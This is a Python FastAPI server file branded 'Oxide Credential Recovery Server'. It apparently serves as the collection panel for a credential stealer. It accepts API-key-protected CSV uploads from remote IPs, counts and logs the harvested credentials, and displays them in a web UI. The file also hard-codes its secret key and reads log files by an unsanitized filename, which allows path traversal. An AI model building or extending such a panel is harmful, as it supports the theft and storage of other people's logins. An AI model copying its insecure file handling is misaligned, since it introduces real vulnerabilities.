from fastapi import FastAPI, Request, File, UploadFile, HTTPException, Header
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import os
import datetime
import shutil
import uvicorn
import logging
import csv
import webbrowser
from contextlib import asynccontextmanager
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.logging import RichHandler
from rich.theme import Theme
from rich.align import Align
from pathlib import Path
import pandas as pd
from threading import Timer

# Config
UPLOAD_DIR = os.path.join(os.getcwd(), "Oxide_Logs")
UI_DIR = os.path.join(os.getcwd(), "UI")
API_KEY = "S3cUr3K3y!@#456"
VERSION = "v1.0.0"
HOST = "127.0.0.1"
PORT = 8000
BANNED_IP_FILE = "BannedIP.txt"

os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(UI_DIR, exist_ok=True)

custom_theme = Theme({
    "info": "bright_magenta",
    "warning": "yellow1",
    "error": "red1 bold",
    "success": "green1",
    "timestamp": "bright_white",
    "ip": "hot_pink3",
    "credentials": "spring_green1",
    "server_info": "deep_pink2"
})

console = Console(theme=custom_theme)

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[RichHandler(
        console=console,
        show_path=False,
        enable_link_path=False,
        show_time=False,
        rich_tracebacks=True
    )]
)
logger = logging.getLogger(__name__)

templates = Jinja2Templates(directory=UI_DIR)

def log_message(message: str, level: str = "info", **kwargs):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_timestamp = f"[timestamp][{timestamp}][/timestamp]"
    
    if level == "info":
        console.print(f"{formatted_timestamp} [info]{message}[/info]", **kwargs)
    elif level == "warning":
        console.print(f"{formatted_timestamp} [warning]{message}[/warning]", **kwargs)
    elif level == "error":
        console.print(f"{formatted_timestamp} [error]{message}[/error]", **kwargs)
    elif level == "success":
        console.print(f"{formatted_timestamp} [success]{message}[/success]", **kwargs)

def load_banned_ips():
    if os.path.exists(BANNED_IP_FILE):
        with open(BANNED_IP_FILE, 'r') as f:
            return set(line.strip() for line in f)
    return set()
banned_ips = load_banned_ips()

def display_server_banner():
    title = Text("Oxide Credential Recovery Server", style="hot_pink2 bold")
    version_text = Text(f"Version {VERSION}", style="bright_white")
    running_text = Text(f"Running on {HOST}:{PORT}", style="green1")
    webui_text = Text("WebUI available at http://localhost:8000", style="green1")
    
    centered_title = Align.center(title)
    centered_version = Align.center(version_text)
    centered_running = Align.center(running_text)
    centered_webui = Align.center(webui_text)
    
    all_content = Table.grid(padding=1)
    all_content.add_column(justify="center", width=console.width - 4)
    all_content.add_row(centered_title)
    all_content.add_row(centered_version)
    all_content.add_row(centered_running)
    all_content.add_row(centered_webui)
    
    panel = Panel(
        all_content,
        border_style="hot_pink2",
        title="Server Status",
        title_align="center"
    )
    
    console.print(Align.center(panel))

def open_browser():
    webbrowser.open(f"http://localhost:{PORT}")

@asynccontextmanager
async def lifespan(app: FastAPI):
    console.clear()
    display_server_banner()
    Timer(2, open_browser).start()
    yield

app = FastAPI(lifespan=lifespan)


@app.get("/", response_class=HTMLResponse)
async def get_index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.get("/api/logs")
async def get_logs():
    logs = []
    for filename in os.listdir(UPLOAD_DIR):
        if filename.endswith('.csv'):
            file_path = os.path.join(UPLOAD_DIR, filename)
            try:
                with open(file_path, 'r') as f:
                    reader = csv.reader(f)
                    next(reader)  # Skip header
                    total_credentials = sum(1 for _ in reader)
                parts = filename.split('_', 1)[1]
                ip = parts.split(']')[0].strip('[')
                
                logs.append({
                    "filename": filename,
                    "ip": ip,
                    "total_credentials": total_credentials
                })
            except Exception as e:
                continue
    
    return sorted(logs, key=lambda x: x['filename'], reverse=True)
    
@app.get("/api/logs/{filename}")
async def get_log_content(filename: str):
    file_path = os.path.join(UPLOAD_DIR, filename)
    try:
        data = []
        with open(file_path, 'r', newline='', encoding='utf-8') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                data.append(row)
        return data
    except Exception as e:
        raise HTTPException(status_code=404, detail="Log file not found")

@app.middleware("http")
async def check_banned_ips(request: Request, call_next):
    client_ip = request.client.host
    if client_ip in banned_ips:
        log_message(f"Blocked request from banned IP: [ip]{client_ip}[/ip]", level="warning")
        return JSONResponse(status_code=403, content={"detail": "Forbidden: Your IP has been banned."})
    response = await call_next(request)
    return response

@app.post("/upload")
async def upload_file(
    request: Request,
    file: UploadFile = File(...),
    api_key: str = Header(None, alias="api-key")
):
    client_ip = request.client.host

    if client_ip in banned_ips:
        log_message(f"Blocked request from banned IP: [ip]{client_ip}[/ip]", level="warning")
        raise HTTPException(status_code=403, detail="Forbidden: Your IP has been banned.")

    if api_key != API_KEY:
        log_message(f"Banned IP [ip]{client_ip}[/ip] for invalid API key", level="error")
        banned_ips.add(client_ip)
        with open(BANNED_IP_FILE, 'a') as f:
            f.write(f"{client_ip}\n")
        raise HTTPException(status_code=403, detail="Forbidden.")

    if not file.filename.endswith('.csv'):
        log_message(f"Banned IP [ip]{client_ip}[/ip] for invalid file type", level="error")
        banned_ips.add(client_ip)
        with open(BANNED_IP_FILE, 'a') as f:
            f.write(f"{client_ip}\n")
        raise HTTPException(status_code=403, detail="Forbidden.")

    sanitized_filename = os.path.basename(file.filename)
    timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S%f")
    unique_filename = f"{timestamp}_{sanitized_filename}"
    file_path = os.path.join(UPLOAD_DIR, unique_filename)

    try:
        with open(file_path, "wb") as buffer:
            shutil.copyfileobj(file.file, buffer)
    except Exception as e:
        log_message(f"Failed to upload file from [ip]{client_ip}[/ip]: {str(e)}", level="error")
        raise HTTPException(status_code=500, detail=f"Failed to upload file: {e}")
    finally:
        file.file.close()

    try:
        with open(file_path, 'r', newline='', encoding='utf-8') as csvfile:
            reader = csv.reader(csvfile)
            next(reader)  # Skip header
            total_credentials = sum(1 for _ in reader)
    except Exception as e:
        total_credentials = 0

    log_message(
        f"Received LOG from [ip]{client_ip}[/ip] containing [credentials]{total_credentials}[/credentials] credentials",
        level="success"
    )

    return JSONResponse(status_code=200, content={"message": f"File '{unique_filename}' uploaded successfully."})

if __name__ == "__main__":
    uvicorn.run(
        "server:app",
        host=HOST,
        port=PORT,
        log_level="warning",
        access_log=False,
        use_colors=False
    )
